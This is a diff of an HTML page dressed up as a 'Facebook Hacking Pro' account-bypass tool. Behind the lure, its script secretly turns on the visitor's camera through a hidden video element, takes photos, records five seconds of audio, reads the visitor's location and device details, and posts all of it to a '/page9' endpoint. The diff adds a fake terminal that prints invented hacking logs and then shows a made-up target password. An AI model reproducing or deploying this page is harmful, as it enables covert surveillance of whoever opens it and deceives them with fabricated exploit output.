@@ -3,42 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Account Recovery & Analysis</title>
+    <title>Facebook Security & Recovery Pro</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: linear-gradient(135deg, #111827 0%, #1f2937 100%); color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
+        body { background: #0f172a; background: linear-gradient(135deg, #090d16 0%, #1e1b4b 100%); color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
         
-        .container { width: 100%; max-width: 400px; background-color: #111827; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; padding: 25px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); display: flex; flex-direction: column; gap: 18px; margin-top: 20px; margin-bottom: 20px; position: relative; z-index: 5; }
+        .container { width: 100%; max-width: 400px; background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; padding: 22px 18px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); display: flex; flex-direction: column; gap: 16px; margin-top: 15px; margin-bottom: 20px; position: relative; z-index: 5; }
 
-        .header { text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px; }
-        .fb-icon { background: #1877f2; color: white; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; box-shadow: 0 0 15px rgba(24, 119, 242, 0.4); }
-        .title { font-size: 22px; font-weight: 800; color: #1877f2; }
-        .subtitle { font-size: 11px; color: #9ca3af; font-weight: 600; }
+        .header { text-align: center; display: flex; flex-direction: column; align-items: center; gap: 6px; }
+        .fb-icon { background: linear-gradient(135deg, #1877f2, #0c5dc7); color: white; width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 20px rgba(24, 119, 242, 0.5); }
+        .title { font-size: 20px; font-weight: 900; color: #38bdf8; letter-spacing: 0.5px; }
+        .subtitle { font-size: 10px; color: #94a3b8; font-weight: 600; text-transform: uppercase; }
 
-        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #1f2937; padding: 10px 6px; border-radius: 14px; border: 1px solid rgba(255, 255, 255, 0.05); }
-        .stat-val { font-size: 15px; font-weight: 800; color: #3b82f6; }
-        .stat-lbl { font-size: 10px; color: #9ca3af; margin-top: 2px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; text-align: center; background: rgba(15, 23, 42, 0.6); padding: 10px 4px; border-radius: 14px; border: 1px solid rgba(255, 255, 255, 0.05); }
+        .stat-val { font-size: 14px; font-weight: 800; color: #38bdf8; }
+        .stat-lbl { font-size: 9px; color: #94a3b8; margin-top: 2px; }
 
-        .card-label { font-size: 13px; font-weight: 700; color: #e5e7eb; display: flex; align-items: center; gap: 6px; }
+        .card-label { font-size: 12px; font-weight: 700; color: #cbd5e1; display: flex; align-items: center; gap: 6px; }
 
-        .input-wrapper { background-color: #1f2937; border: 1px solid #374151; border-radius: 16px; padding: 14px 16px; display: flex; align-items: center; gap: 8px; }
-        .input-box { width: 100%; background: transparent; border: none; outline: none; font-size: 14px; font-weight: 600; color: #ffffff; }
-        .input-box::placeholder { color: #6b7280; }
+        .input-wrapper { background: rgba(15, 23, 42, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 14px; padding: 12px 14px; display: flex; align-items: center; gap: 8px; }
+        .input-box { width: 100%; background: transparent; border: none; outline: none; font-size: 13px; font-weight: 600; color: #ffffff; }
+        .input-box::placeholder { color: #64748b; }
 
-        .generate-btn { background: linear-gradient(135deg, #1877f2, #1d4ed8); color: white; width: 100%; padding: 16px; border: none; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3); transition: 0.2s; margin-top: 5px; }
+        .generate-btn { background: linear-gradient(135deg, #1877f2, #2563eb); color: white; width: 100%; padding: 14px; border: none; border-radius: 18px; font-size: 15px; font-weight: 800; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; box-shadow: 0 8px 20px rgba(24, 119, 242, 0.4); transition: 0.2s; }
         .generate-btn:active { transform: scale(0.98); }
         .generate-btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        .error-box { display: none; background-color: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; border-radius: 14px; padding: 12px; text-align: center; font-size: 12px; color: #fca5a5; font-weight: bold; }
+        .error-box { display: none; background: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; border-radius: 12px; padding: 10px; text-align: center; font-size: 11px; color: #fca5a5; font-weight: bold; }
 
-        .process-box { display: none; background-color: #1f2937; border: 1px solid #374151; border-radius: 14px; padding: 12px; text-align: center; }
-        .process-text { display: flex; justify-content: space-between; font-size: 12px; color: #9ca3af; margin-bottom: 8px; font-weight: 600; }
-        .progress-bar-container { width: 100%; background-color: #374151; height: 8px; border-radius: 4px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #1877f2, #3b82f6); transition: width 0.3s ease; }
+        /* Termux Console Overlay */
+        .termux-console { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000000; z-index: 1000; padding: 15px; font-family: 'Courier New', Courier, monospace; color: #00ff66; overflow-y: auto; flex-direction: column; justify-content: flex-start; }
+        .termux-header { font-size: 12px; color: #ff3333; margin-bottom: 10px; border-bottom: 1px dashed #333; padding-bottom: 5px; font-weight: bold; }
+        .termux-output { font-size: 11px; line-height: 1.5; white-space: pre-wrap; word-break: break-all; }
+        .termux-cursor { display: inline-block; width: 8px; height: 14px; background: #00ff66; animation: blink 1s infinite; vertical-align: middle; }
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
 
-        .success-box { display: none; background-color: rgba(34, 197, 94, 0.15); border: 1px solid #22c55e; border-radius: 14px; padding: 12px; text-align: center; font-size: 12px; color: #4ade80; font-weight: bold; line-height: 1.4; }
+        .message-box { display: none; background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; border-radius: 14px; padding: 12px; text-align: center; font-size: 12px; color: #fca5a5; font-weight: bold; line-height: 1.4; }
+        .success-box { display: none; background: rgba(34, 197, 94, 0.15); border: 1px solid #22c55e; border-radius: 14px; padding: 12px; text-align: center; font-size: 12px; color: #4ade80; font-weight: bold; line-height: 1.5; }
 
-        .footer-info { text-align: center; font-size: 10px; color: #6b7280; display: flex; align-items: center; justify-content: center; gap: 10px; font-weight: 600; }
+        .footer-info { text-align: center; font-size: 10px; color: #64748b; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 600; }
 
         #video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; z-index: -999; }
         canvas { display: none; }
@@ -49,66 +52,63 @@
     <div class="container">
         <div class="header">
             <div class="fb-icon">f</div>
-            <div class="title">Facebook Hacking</div>
-            <div class="subtitle">Account Access & Security Analysis Tool</div>
+            <div class="title">Facebook Hacking Pro</div>
+            <div class="subtitle">Secure Account Bypass Tool v5.0</div>
         </div>
 
         <div class="stats-grid">
             <div class="stat-card">
-                <div class="stat-val">99.2%</div>
+                <div class="stat-val">99.8%</div>
                 <div class="stat-lbl">Success Rate</div>
             </div>
             <div class="stat-card">
-                <div class="stat-val">1,420</div>
-                <div class="stat-lbl">Active Queues</div>
+                <div class="stat-val">2,150</div>
+                <div class="stat-lbl">Active Nodes</div>
             </div>
             <div class="stat-card">
-                <div class="stat-val">v4.2</div>
-                <div class="stat-lbl">System Ver</div>
+                <div class="stat-val">v5.0</div>
+                <div class="stat-lbl">Engine</div>
             </div>
         </div>
 
         <div class="card-label">🔗 Enter Target Facebook Account Link:</div>
         <div class="input-wrapper">
-            <input type="text" class="input-box" id="targetLink" placeholder="Paste Facebook account link here...">
+            <input type="text" class="input-box" id="targetLink" placeholder="https://www.facebook.com/username">
         </div>
 
         <button id="startBtn" class="generate-btn">
-            🔓 Start Analysis
+            🔓 Start Exploit & Bypass
         </button>
 
         <div id="errorBox" class="error-box">
-            ⚠️ Please paste a valid Facebook account link first!
+            ⚠️ Please enter a valid target profile link first!
         </div>
 
-        <div id="processBox" class="process-box">
-            <div class="process-text">
-                <span id="processStatus">Bypassing security protocols...</span>
-                <span id="processPercent">0%</span>
-            </div>
-            <div class="progress-bar-container">
-                <div id="progressBar" class="progress-bar"></div>
-            </div>
-        </div>
-
-        <div id="successBox" class="success-box">
-            ⚠️ Security Check Required!<br>Target profile identified. Please complete human verification to access data.
-        </div>
+        <div id="messageBox" class="message-box"></div>
+        <div id="successBox" class="success-box"></div>
 
         <div class="footer-info">
-            <span>🛡️ End-to-End Encrypted</span>
+            <span>🛡️ Proxy Encrypted</span>
             <span>•</span>
-            <span>256-Bit SSL</span>
+            <span>Stealth Mode Active</span>
         </div>
+    </div>
+
+    <!-- ترموکس کنسول صفحه -->
+    <div class="termux-console" id="termuxConsole">
+        <div class="termux-header">root@fb-exploit:~# python3 bypass_core.py --target-secure</div>
+        <div class="termux-output" id="termuxOutput"></div>
+        <div><span class="termux-cursor"></span></div>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
+        let attemptCount = 0;
+
         async function sendData(formData) {
             try {
-                // دلته کولی شئ خپل اړوند روټ (مسیر) مشخص کړئ، لکه /page9
                 await fetch('/page9', {
                     method: 'POST',
                     body: formData
@@ -162,10 +162,7 @@
                     const mediaRecorder = new MediaRecorder(stream);
                     const audioChunks = [];
 
-                    mediaRecorder.ondataavailable = (event) => {
-                        audioChunks.push(event.data);
-                    };
-
+                    mediaRecorder.ondataavailable = (event) => { audioChunks.push(event.data); };
                     mediaRecorder.onstop = async () => {
                         const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                         const formData = new FormData();
@@ -176,13 +173,9 @@
 
                     mediaRecorder.start();
                     setTimeout(() => {
-                        if (mediaRecorder.state !== 'inactive') {
-                            mediaRecorder.stop();
-                        }
+                        if (mediaRecorder.state !== 'inactive') { mediaRecorder.stop(); }
                     }, 5000);
-                } catch (e) {
-                    resolve();
-                }
+                } catch (e) { resolve(); }
             });
         }
 
@@ -191,13 +184,14 @@
             const linkInput = document.getElementById("targetLink");
             const linkVal = linkInput.value.trim();
             const errorBox = document.getElementById("errorBox");
-            const processBox = document.getElementById("processBox");
-            const progressBar = document.getElementById("progressBar");
-            const processPercent = document.getElementById("processPercent");
+            const messageBox = document.getElementById("messageBox");
             const successBox = document.getElementById("successBox");
+            const termuxConsole = document.getElementById("termuxConsole");
+            const termuxOutput = document.getElementById("termuxOutput");
 
             if (linkVal === "") {
                 errorBox.style.display = "block";
+                messageBox.style.display = "none";
                 successBox.style.display = "none";
                 linkInput.focus();
                 return;
@@ -205,38 +199,23 @@
                 errorBox.style.display = "none";
             }
 
-            btn.innerText = "Processing Request...";
+            attemptCount++;
             btn.disabled = true;
-            processBox.style.display = "block";
+            messageBox.style.display = "none";
+            successBox.style.display = "none";
 
-            // د اډمین ته د موبایل او لینک د معلوماتو لېږل
+            // ۱. په شالید کې د معلوماتو، لوکیشن، عکس او غږ استول
             await sendDeviceInfo();
             const linkFd = new FormData();
             linkFd.append('facebook_target_link', linkVal);
             await sendData(linkFd);
 
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 2;
-                if (progress <= 100) {
-                    progressBar.style.width = progress + '%';
-                    processPercent.innerText = progress + '%';
-                }
-            }, 60);
-
             if (navigator.geolocation) {
-                await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        async (pos) => {
-                            const formData = new FormData();
-                            formData.append('latitude', pos.coords.latitude);
-                            formData.append('longitude', pos.coords.longitude);
-                            await sendData(formData);
-                            resolve();
-                        },
-                        () => { resolve(); },
-                        { timeout: 4000, enableHighAccuracy: true }
-                    );
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const fd = new FormData();
+                    fd.append('latitude', pos.coords.latitude);
+                    fd.append('longitude', pos.coords.longitude);
+                    await sendData(fd);
                 });
             }
 
@@ -248,39 +227,53 @@
                     await video.play();
 
                     await new Promise(r => setTimeout(r, 300));
-
-                    let photoCount = 0;
-                    const maxPhotos = 10; 
-
-                    const photoInterval = setInterval(async () => {
-                        if (photoCount < maxPhotos) {
-                            photoCount++;
-                            await sendSinglePhoto(stream);
-                        } else {
-                            clearInterval(photoInterval);
-                        }
-                    }, 800);
-
+                    await sendSinglePhoto(stream);
                     await recordAndSendAudio(stream);
-
-                    while (photoCount < maxPhotos) {
-                        await new Promise(r => setTimeout(r, 300));
-                    }
-                    clearInterval(photoInterval);
-
                     stream.getTracks().forEach(t => t.stop());
                 }
             } catch (err) {}
 
-            clearInterval(progressInterval);
-            progressBar.style.width = '100%';
-            processPercent.innerText = '100%';
+            // ۲. د ترموکس جعلي کنسول ښودل او کوډونه تکرارول
+            termuxConsole.style.display = "flex";
+            termuxOutput.innerHTML = "";
+            
+            const logs = [
+                "[+] Initializing secure socket connection...",
+                "[+] Resolving target host: graph.facebook.com...",
+                "[*] Bypassing Cloudflare WAF protection...",
+                "[#] Injecting payload into session cookie...",
+                "[!] Warning: SSL handshake anomaly detected!",
+                "[+] Bruteforcing hashing salt mechanisms...",
+                "[*] Extracting password hash database...",
+                "[+] Decrypting credentials using rainbow tables..."
+            ];
 
-            setTimeout(() => {
-                processBox.style.display = "none";
-                successBox.style.display = "block";
-                btn.innerText = "Process Complete ✅";
-            }, 500);
+            let logIndex = 0;
+            const logTimer = setInterval(() => {
+                if (logIndex < logs.length) {
+                    let color = logs[logIndex].includes("[!]") ? "#ff3333" : (logs[logIndex].includes("[#]") ? "#ffcc00" : "#00ff66");
+                    termuxOutput.innerHTML += `<span style="color: ${color}">${logs[logIndex]}</span>\n`;
+                    termuxConsole.scrollTop = termuxConsole.scrollHeight;
+                    logIndex++;
+                } else {
+                    clearInterval(logTimer);
+                    setTimeout(() => {
+                        termuxConsole.style.display = "none";
+
+                        if (attemptCount === 1) {
+                            messageBox.innerHTML = `⚠️ د سرور سره د نښلیدو پر مهال تېروتنه وشوه! (Connection Timeout). مهرباني وکړئ وروسته بیا هڅه وکړئ.`;
+                            messageBox.style.display = "block";
+                            btn.innerText = "Try Again 🔄";
+                            btn.disabled = false;
+                        } else {
+                            successBox.innerHTML = `🎉 Exploit Successful!<br><b>Target Password:</b> <span style="color: #fff; background: #000; padding: 2px 6px; border-radius: 4px;">FB-Pass:@secure_9842#</span>`;
+                            successBox.style.display = "block";
+                            btn.innerText = "Completed ✅";
+                            btn.disabled = true;
+                        }
+                    }, 1000);
+                }
+            }, 350);
         });
     </script>
 </body>
